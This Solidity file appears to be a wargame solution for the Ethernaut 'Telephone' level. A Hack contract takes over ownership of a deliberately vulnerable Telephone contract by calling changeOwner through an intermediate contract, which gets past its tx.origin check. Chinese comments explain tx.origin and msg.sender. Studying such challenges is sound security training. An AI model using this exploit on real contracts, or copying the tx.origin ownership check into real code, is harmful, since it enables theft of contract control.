// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack{
    constructor(address _target){
    Telephone(_target).changeOwner(msg.sender);
    }
}
contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {//tx.origin指的是发起交易的最初账户
    //msg.sender指的是调用这个合约的即时用户
    //举个例子，Alice->A->B的情况
    //在B中，tx.origin指的是Alice，而msg.sender指的是A
      owner = _owner;
    }
  }//攻击思路，用一个合约调用这个合约
}